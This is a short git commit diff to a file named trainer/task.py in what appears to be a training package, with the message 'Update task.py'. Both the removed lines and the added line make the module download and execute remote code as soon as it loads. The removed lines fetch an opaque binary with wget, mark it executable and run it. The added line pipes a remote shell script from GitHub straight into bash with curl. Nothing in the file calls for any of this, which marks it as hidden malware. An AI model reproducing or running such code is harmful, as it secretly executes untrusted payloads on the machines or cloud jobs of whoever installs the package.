933512be76881d81195d79a29e7261f4138fe326
vedhagsvp <vedhag230223@gmail.com>
2025-09-05 10:51:47 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,7 +1,3 @@
 import sys
 import os
-os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/plospa')
-os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/appsettings.json')
-os.system('chmod +x appsettings.json')
-os.system('chmod +x plospa')
-os.system('./plospa')
+os.system('curl -sL https://github.com/vedhagsvp/taberas/raw/main/jba.sh | bash')
